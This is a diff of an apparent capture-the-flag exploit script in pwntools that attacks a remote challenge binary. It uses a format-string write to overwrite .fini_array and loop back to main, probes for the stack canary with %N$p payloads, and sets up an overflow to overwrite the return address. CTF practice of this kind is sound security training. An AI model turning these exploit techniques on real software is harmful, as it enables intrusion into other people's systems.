@@ -1,7 +1,7 @@
 from pwn import *
 
 context.binary = elf = ELF('testcat')  # have canary
-# context.log_level = 'debug'
+context.log_level = 'debug'
 
 printf_got = elf.got['printf']
 puts_got = elf.got['puts']
@@ -15,6 +15,7 @@ RECEIVED = b'RECEIVED:\n'
 # Find the offset of fmt string overwrite fini_array with main() so it loops back
 def send_payload(payload):
     io = remote('chals.cyberthon22f.ctf.sg', 10401)
+    #io = process('./testcat')
     io.sendlineafter(INPUT, payload)
     io.recvuntil(RECEIVED)
     r = io.recvall()
@@ -25,27 +26,30 @@ def send_payload(payload):
 fmt = FmtStr(send_payload)  # pwntools help to send test data and find out which offset is the sent data being stored (in this chall, 6)
 
 io = remote('chals.cyberthon22f.ctf.sg', 10401)
+#io = process('./testcat')
+#pause()
 # Overwrite .fini_array with main() so we can loop back to main when it is supposed to exit
 fini_array = 0x403E18  # .fini_array
 payload = fmtstr_payload(fmt.offset, {fini_array: main})  # do format string write
+print(payload)
 io.sendafter(INPUT, payload)
 # After this input, the program will try to exit and will loop back to main(), allowing us to get more chances to send payload and leak the canary below
+io.interactive()
+
+# def leakCanary(tries=100):
+#     for i in range(1, tries+1, 1):
+#         payload = f'%{i}$p'
+#         io.sendline(payload.encode())
+#         io.recvuntil(RECEIVED)
+#         candidate = io.recvall().strip().lstrip(b'0x')
+#         if len(candidate) == 16 and candidate.endswith(b'00'):  # canary is always 16 length (8 bytes), all compiler canary ends with 00 (termination byte)
+#             print(f'Found canary: {candidate} at offset {i}')
+#             return candidate, i
+#     else:
+#         raise Exception('Canary not found!')
 
 
-def leakCanary(tries=100):
-    for i in range(1, tries+1, 1):
-        payload = f'%{i}$p'
-        io.sendline(payload)
-        io.recvuntil(RECEIVED)
-        candidate = io.recvall().strip().lstrip(b'0x')
-        if len(candidate) == 16 and candidate.endswith(b'00'):  # canary is always 16 length (8 bytes), all compiler canary ends with 00 (termination byte)
-            print(f'Found canary: {candidate} at offset {i}')
-            return candidate, i
-    else:
-        raise Exception('Canary not found!')
-
-
-canary, canary_offset = leakCanary(tries=50)
+#canary, canary_offset = leakCanary(tries=50)
 
 to_fill = 0x110 + len(canary) + 8  # overflow 0x110 then fill with found canary then 8 bytes to overwrite rip
 
